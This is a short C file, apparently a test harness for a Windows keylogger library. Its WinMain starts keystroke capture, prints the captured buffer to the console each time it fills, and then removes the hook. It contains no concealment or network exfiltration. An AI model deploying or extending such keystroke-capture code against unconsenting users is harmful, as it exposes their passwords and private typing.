#include "WinKeylogger.h"
#include <stdio.h>

int APIENTRY WinMain(
                     HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     PSTR pCmdLine,
                     int nCmdShow
                    )
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(pCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    WCHAR tmp_buff[WINKEYLOGGER_BUFSIZ];

    StartWinKeylogger();

    size_t buflen = 0;
    while (LogNextKeystroke(&buflen)) {
        if (buflen == WINKEYLOGGER_BUFSIZ - 1) {
            StrCpyLoggedBuffer(tmp_buff);
            wprintf(L"%s\n",  tmp_buff);
            buflen = 0;
        }
    }

    if (buflen) {
        StrCpyLoggedBuffer(tmp_buff);
        wprintf(L"BUFLEN: %u, %s\n",  buflen, tmp_buff);
    }

    RemoveWinKeylogger();
    return 0;
}
